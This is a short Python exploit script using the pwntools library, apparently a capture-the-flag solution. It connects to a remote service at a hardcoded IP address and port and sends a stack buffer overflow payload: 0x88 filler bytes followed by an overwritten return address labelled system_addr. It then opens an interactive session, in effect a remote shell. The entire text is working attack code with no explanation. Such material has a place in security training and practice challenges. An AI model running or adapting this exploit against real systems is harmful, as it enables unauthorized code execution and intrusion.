from pwn import *

conn = remote('111.200.241.244',52948)
system_addr = 0x400596
payload = b'A' * 0x88 + p64(system_addr)
conn.recvuntil("Hello, World")
conn.sendline(payload)
conn.interactive()